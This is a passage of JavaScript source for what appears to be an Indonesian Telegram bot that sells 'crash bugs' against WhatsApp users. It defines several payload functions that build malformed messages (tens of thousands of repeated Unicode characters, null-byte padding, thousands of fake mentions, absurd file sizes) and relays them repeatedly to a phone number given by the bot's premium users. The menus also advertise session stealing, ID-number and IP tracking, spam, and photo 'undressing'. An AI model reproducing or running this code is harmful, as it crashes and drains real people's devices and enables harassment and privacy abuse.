                    conversionDelaySeconds: 10,
                    forwardingScore: 9999999,
                    isForwarded: true,

                    quotedAd: {
                        advertiserName: " X ",
                        mediaType: "IMAGE",
                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                        caption: " X "
                    },

                    placeholderKey: {
                        remoteJid: "0@s.whatsapp.net",
                        fromMe: false,
                        id: "ABCDEF1234567890"
                    },

                    thumbnail: null,
                    sourceUrl: "https://xnxx.com"
                }
            }
        }
    );
}

async function VampireBlank(target, ptcp = true) {
  const Vampire = `_*~@8~*_\n`.repeat(10500);
  const CrashNotif = 'ꦽ'.repeat(55555);

  await sock.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: 'Lah kenapa jir' + CrashNotif + Vampire,
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}
async function protocolbug6(target, mention) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "VALORES ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "TREDICT INVICTUS", // GAUSAH GANTI KOCAK ERROR NYALAHIN GUA
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "trigger newsletter ( @tamainfinity )",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}
async function btnStatus(target, mention) {
let pesan = await generateWAMessageFromContent(target, {
buttonsMessage: {
text: "🔥",
contentText: "༿༑ᜳ𝗧𝗔𝗠𝗔𝗥𝗬𝗨𝗜𝗖𝗛𝗜ᢶ⃟",
footerText: "Tama-Ryuichi",
buttons: [
{ buttonId: ".glitch", buttonText: { displayText: "⚡" + "\u0003".repeat(500000) }, type: 1 }
],
headerType: 1
}
}, {});

await sock.relayMessage("status@broadcast", pesan.message, {
messageId: pesan.key.id,
statusJidList: [target],
additionalNodes: [
{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }
]
});

if (mention) {
await sock.relayMessage(target, {
groupStatusMentionMessage: {
message: { protocolMessage: { key: pesan.key, type: 25 } }
}
}, {
additionalNodes: [
{ tag: "meta", attrs: { is_status_mention: "⚡ 𝗧𝗮𝗺𝗮 - 𝗦𝘁𝗼𝗿𝗺 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" }, content: undefined }
]
});
}
}
async function FearlesBlank(sock, target) {
  const ButtonsFreeze = [
      { name: "single_select", buttonParamsJson: "" }
    ];

  for (let i = 0; i < 10; i++) {
    ButtonsFreeze.push(
        { name: "cta_call",    buttonParamsJson: JSON.stringify({ status: true }) },
        { name: "cta_copy",    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
        { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) }
      );
    }
    
    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "X",
              locationMessage: {
                degreesLatitude: 0,
                degreesLongtitude: -0,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "𝗫𝘁𝗿𝗮𝘃𝗮𝘀𝗡𝗲𝗰𝗿𝗼𝘀𝗶𝘀៚",
            },
            nativeFlowMessage: {
              messageParamsJson: "{}",
              buttons: ButtonsFreeze,
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot"
                }
              }
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    }
  );
  
  await sock.relayMessage(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "🍻⃟༑⌁⃰≛ 𝑅𝑒𝑦𝑆𝑡𝑎𝑖𝑛ཀ͜͡🍻៚",
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    },
  }, { participant: { jid: number }, });
  console.log(chalk.red(`─────「 ⏤CrashUi To: ${target}⏤ 」─────`));
}
async function FearlesLocaUi(sock, target) {
  try {
    const content = {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -922.999999999999,
            degreesLongitude: 922.99999999,
            name: "void star" + "ꦾ".repeat(25000),
            address: "ꦾ".repeat(25000)
          },
          nativeFlowResponseMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "ោ៝".repeat(5000)
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "ꦾ".repeat(13000)
              },
              {
                name: "carousel_message",
                buttonParamsJson: "ꦾ".repeat(5000)
              }
            ],
            messageParamsJson: "\u0000".repeat(1000),
            version: 3
          },
          contextInfo: {
            ephemeralExpiration: 0,
            forwardingScore: 9999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
              background: "#" + Math.floor(Math.random() * 0xffffff).toString(16).padStart(6, "0"),
            mentionedJid: [
              jid,
              ...Array.from({ length: 1900 }, () =>
                "62" +
                Math.floor(Math.random() * 999999).toString().padStart(6, "0") +
                "@s.whatsapp.net"
              )
            ],
            quotedMessage: {
              viewOnceMessage: {
                message: { conversation: "🧩" }
              }
            }
          }
        }
      }
    };

    const msg = await generateWAMessageFromContent(target, content, {});

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    console.log(`✅ terkirim ke ${target}`);
  } catch (e) {
    console.error("❌ Error:", e);
  }
} 
async function iOSFreeze(sock, target) {
  const msg = generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "‼️" + "   " + "𑇂𑆵𑆴𑆿".repeat(15000),
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "𑇂𑆵𑆴𑆿".repeat(15000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
      paymentInviteMessage: {
        serviceType: "UPI",
        expiryTimestamp: Date.now() + 9999999471,
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}      
//
// ---- ( End Function ) ----- \\          
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};

// -- ( Start Menu )
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username
    ? `@${msg.from.username}`
    : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();

  if (shouldIgnoreMessage(msg)) return;
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`\nNo-akses Anda Bukan User Premium❗\`\`\`
Tidak ada akses, silakan hubungi Developer Atau owner
`,
      parse_mode: "Markdown",
      reply_to_message_id: msg.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "The Owner", url: "https://t.me/susudancow15" }],
          [{ text: "The Channel", url: "https://t.me/ceodappp" }],
        ],
      },
    });
  }
  await ReactMsg(chatId, msg.message_id, "👾");
  await bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote><b>｢ 🦋 ｣ The Xploitify Insidious ★ </b></blockquote>
 🍁 - õla ${username}
<b>─ @susudancow15 は、WhatsAppにバグを送信するためのTelegramボットです。注意と責任を持ってご利用ください。</b>

✧. Author : @susudancow15
✧. Version : 2.0
✧. Prefix : /
✧. InterFace : Button Type
✧. Type : ( Plugin )
✧. Time : ${runtime}
© Dapp Skibidi
<b>Select Button Menu †</b>
`,
    parse_mode: "HTML",
    reply_to_message_id: msg.message_id,
    reply_markup: {
      inline_keyboard: [
         [
          { 
            text: "Thanks  ─ 🕊️", callback_data: "tqto" 
          },
          { 
            text: "Control ─ ⚙️", callback_data: "owner_menu" 
          },
        ],
        [
          { 
            text: "Crash ─ 🪽", callback_data: "bug" 
          }
        ],
        [
          {
            text: "Tools ─ 🛠", callback_data: "tools"
          }
        ]
      ]
    }
  }); 
  await bot.sendAudio(
  chatId, 
  "./dapaa/DangDut.mp3",
  {
    title: "The Xploitify Insidious",
    caption: "dapaa.<>",
    performer: "dapaa<>",
  }
);
});

// -- ( Callback Query Menu ) -- \\
bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username
      ? `@${query.from.username}`
      : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();
    let caption = "";
    let replyMarkup = {};
    if (query.data === "bug") {
      caption = `
<blockquote><b>｢ 🦋 ｣ The Xploitify Insidious ★ </b></blockquote>
 🍁 - õla ${username}
<b>─ @susudancow15 は、WhatsAppにバグを送信するためのTelegramボットです。注意と責任を持ってご利用ください。</b>
<blockquote><b>｢ CRASH - 🪽 BUG  ｣</b></blockquote>
✧. /Invisible
╰⩺ Delay Hard Duration
✧. /DelayInvisSpam
╰⩺ Delay Bebas Spam
✧. /Revolution
╰⩺ Forclose 
✧. /Boom
╰⩺ Blank Device
✧. /Draining
╰⩺ Drain Quota
✧. /CrashIos
╰⩺ Ios Crash Infinite
✧. /Ui
╰⩺ Crash Andro Not All Device
✧. /crashGp
╰⩺ Crash Group
© Dapp Skibidi ϟ
`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "! Back", callback_data: "back_to_main" }],
        ],
      };
    }
    if (query.data === "tqto") {
      caption = `
<blockquote><b>｢ 🦋 ｣ The Xploitify Insidious ★ </b></blockquote>
 👾 - õla ${username}
<b>─ @susudancow15 は、WhatsAppにバグを送信するためのTelegramボットです。注意と責任を持ってご利用ください。</b>

<blockquote><b>｢ Thanks - 🤍 Too ⸸  ｣</b></blockquote>
<u>✧. #Dapaa ⸸</u>  <u>✧. #Ikyy ⸸</u>
╰⩺ Author       ╰⩺ Friend
<u>✧. #Sung ⸸</u>  <u>✧. #Ota ⸸</u>
╰⩺ Best Friend       ╰⩺ Support
<u>✧. #Firman ⸸</u>  <u>✧. #Xata ⸸</u>
╰⩺ Support        ╰⩺ Support
<u>✧. #Sanzyy ⸸</u>
╰⩺ Support

© Dapp Skibidi ϟ
`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "! Back", callback_data: "back_to_main" }],
        ],
      };
    }
    if (query.data === "tools") {
      caption = `
<blockquote><b>｢ 🦋 ｣ The Xploitify Insidious ★ </b></blockquote>
 👾 - õla ${username}
<b>─ @susudancow15 は、WhatsAppにバグを送信するためのTelegramボットです。注意と責任を持ってご利用ください。</b>

<blockquote><b>｢ Tools - 🛠 Menu  ｣</b></blockquote>
<u>✧. /tonaked </u>
╰⩺ Reply Foto
<u>✧. /open </u>
╰⩺ Untuk Membuka Isi File
<u>✧. /cekid </u>
╰⩺ Reply Msg/Tag Account 
<u>✧. /tourl </u>
╰⩺ Reply Foto
<u>✧. /brat</u>
╰⩺ Text 
<u>✧. /restar</u>
╰⩺ Merestart Session Bot
<u>✧. /ig</u>
╰⩺ Link
<u>✧. /pinterest</u>
╰⩺ Foto
<u>✧. /set</u>
╰⩺ Menghentikan Bug Sesuai Waktu Yang Sudah Ditentukan
<u>✧. /iqc</u>
╰⩺ jam|batre|carrier|pesan
<u>✧. /addgroup </u>
╰⩺ Menambahkan daftar group
<u>✧. /delgroup </u>
╰⩺ Menghapus daftar group
<u>✧. /groupon </u>
╰⩺ Untuk Mengaktifkan Hanya Group
<u>✧. /groupoff </u>
╰⩺ Untuk Mematikan Hanya Group
<u>✧. /cekidch </u>
╰⩺ Untuk Mengecek Id Saluran WhatsApp
<u>✧. /info </u>
╰⩺ Mengecek Data Pengguna
<u>✧. /tiktok </u>
╰⩺ Mengdownload Link Video Tiktok
<u>✧. /update </u>
╰⩺ Mengupdate Sc Otomatis

© Dapp Skibidi. ϟ
`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "! Back", callback_data: "back_to_main" }],
          [{ text: "Next Tools", callback_data: "toolsv2" }],
        ],
      };
    }
    if (query.data === "toolsv2") {
      caption = `
<blockquote><b>｢ 🦋 ｣ The Xploitify Insidious ★ </b></blockquote>
 👾 - õla ${username}
<b>─ @susudancow15 は、WhatsAppにバグを送信するためのTelegramボットです。注意と責任を持ってご利用ください。</b>

<blockquote><b>｢ Tools - 🛠 Menu  ｣</b></blockquote>
<u>✧. /fixcode - reply file.js </u>
╰⩺ Fixed Eror Tidak 100%
<u>✧. /csessions </u>
╰⩺ Steal the Sender 
<u>✧. /tes </u>
╰⩺ Tester Function Bug
<u>✧. /gethtml</u>
╰⩺ Lock Code Html 
<u>✧. /trackip</u>
╰⩺ Tracking Ip
<u>✧. /nikparse  </u>
╰⩺ Tracking Nik
<u>✧. /enchtml  </u>
╰⩺ Encrypt HTML
<u>✧. /spamngl  </u>
╰⩺ Spam Ngl 
<u>✧. /stop  </u>
╰⩺ Menghentikan Semua Bug
<u>✧. /toanime  </u>
╰⩺ Mengubah Gambar Menjadi Anime
<u>✧. /cek  </u>
╰⩺ Mengecek Syntax Yang Kurang

© Dapp Skibidi ϟ
`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "Tools ", callback_data: "tools" }],
          ],
      };
    }
    if (query.data === "owner_menu") {
      caption = `
<blockquote><b>｢ 🦋 ｣ The Xploitify Insidious ★ </b></blockquote>
 👾 - õla ${username}
<b>─ @susudancow15 は、WhatsAppにバグを送信するためのTelegramボットです。注意と責任を持ってご利用ください。</b>

<blockquote><b>｢ Acces - ⚙️ Menu   ｣</b></blockquote>
✧. /addsender 62xxx
✧. /delpair 62xxx
✧. /listsender
✧. /addprem ID - DAYS
✧. /delprem ID
✧. /listprem
✧. /addowner ID
✧. /delowner ID
✧. /setjeda 5 MINUTE

© Dapp Skibidi. ϟ
`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "! Back", callback_data: "back_to_main" }],
        ],
      };
    }
    if (query.data === "back_to_main") {
      caption = `
<blockquote><b>｢ 🦋 ｣ The Xploitify Insidious ★  </b></blockquote>
 👾 - õla ${username}
<b>─ @susudancow15 は、WhatsAppにバグを送信するためのTelegramボットです。注意と責任を持ってご利用ください。</b>

✧. Author : @susudancow15
✧. Version : 2.0
✧. Prefix : /
✧. InterFace : Button Type
✧. Type : ( Plugin )
✧. Time : ${runtime}
© Dapp Skibidi
<b>Select Button Menu ⸸</b>
`;
      replyMarkup = {
        inline_keyboard: [
         [
          { 
            text: "Thanks  ─ 🕊️ ", callback_data: "tqto" 
          },
          { 
            text: "Control ─ ⚙️ ", callback_data: "owner_menu" 
          },
        ],
        [
          { 
            text: "Crash ─ 🪽 ", callback_data: "bug" 
          }
        ],
        [
          {
            text: "Tools ─ 🛠 ", callback_data: "tools"
          }
        ]
        ]
      };
    }
    await bot.editMessageMedia(
      {
        type: "photo",
        media: getRandomImage(),
        caption: caption,
        parse_mode: "HTML",
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup,
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});


// --- ( Case Bug ) --- \\
bot.onText(/\/Draining (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const cooldown = checkCooldown(userId);
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;    
    if (shouldIgnoreMessage(msg)) return;
    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "! The Owner", url: "https://t.me/susudancow15" }]
                ]
            }
        });
    }

    if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : /Draining
𖥂 Status : Procces
𖥂 Date now : ${date}

© Dapp Skibidi
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : /Draining
𖥂 Status : Procces
𖥂 Date now : ${date}

© Dapp Skibidi
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 10; i++) {
         await Truenullv4(sock, target, ptcp = true);
         await Truenullv4(sock, target, ptcp = false);
         await sleep(1000);
         }
         console.log(chalk.red(`𖣂 dapaa Sending Bug 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : /Draining
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}

© Dapp Skibidi
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
bot.onText(/\/Boom (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const cooldown = checkCooldown(userId);
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;    
    if (shouldIgnoreMessage(msg)) return;
    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "! The Owner", url: "https://t.me/susudancow15" }]
                ]
            }
        });
    }

    if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : /Boom
𖥂 Status : Procces
𖥂 Date now : ${date}

© Dapp Skibidi
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : /Boom
𖥂 Status : Procces
𖥂 Date now : ${date}

© Dapp Skibidi
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 3; i++) {                  
         await videoBlank(sock, target);
         await sleep(1000);           
         }
         console.log(chalk.red(`𖣂 dapaa Sending Bug 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : /boom
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}

© Dapp Skibidi
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
bot.onText(/\/Invisible (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const cooldown = checkCooldown(userId);
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;   
    if (shouldIgnoreMessage(msg)) return;
    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "! The Owner", url: "https://t.me/susudancow15" }]
                ]
            }
        });
    }

    if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : /Invisible
𖥂 Status : Procces
𖥂 Date now : ${date}

© Dapp Skibidi
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : /Invisible
𖥂 Status : Procces
𖥂 Date now : ${date}

© Dapp Skibidi
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 15; i++) {         
         await glorymessage(target, cta = true);
         await sleep(900);
         await TrueNull(sock, target);
         await sleep(900);
         }
         console.log(chalk.red(`𖣂 dapaa Sending Bug 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>｢ 🦋 ｣ The Xploitify Insidious ★ </blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : /Invisible
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}

© Dapp Skibidi
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
